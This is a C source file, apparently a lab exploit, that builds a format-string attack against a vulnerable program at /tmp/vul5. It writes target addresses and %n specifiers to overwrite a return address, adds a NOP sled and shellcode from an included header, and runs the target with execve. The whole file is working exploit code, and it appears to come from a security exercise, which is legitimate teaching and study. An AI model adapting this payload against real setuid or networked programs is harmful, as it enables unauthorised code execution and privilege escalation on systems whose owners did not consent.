#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul5"

int main(void)
{
	char payload[145];
	char ret_payload[] = "\xff\xff\xff\xff\x2c\xfc\xff\xbf\xff\xff\xff\xff\x2d\xfc\xff\xbf\xff\xff\xff\xff\x2e\xfc\xff\xbf\xff\xff\xff\xff\x2f\xfc\xff\xbf%0164u%n%059u%n%0256u%n%0192u%n";
	int i;

	for (i = 0; i < strlen(ret_payload); i++) {
		payload[i] = ret_payload[i];
	}
	for (i = i; i < 100; i++) {
		payload[i] = '\x90';
	}
	for (i = i; i < 100 + strlen(shellcode); i++) {
		payload[i] = shellcode[i - 100];
	}

	char *args[] = { TARGET, payload, NULL };
	char *env[] = { NULL };

	execve(TARGET, args, env);
	fprintf(stderr, "execve failed.\n");

	return 0;
}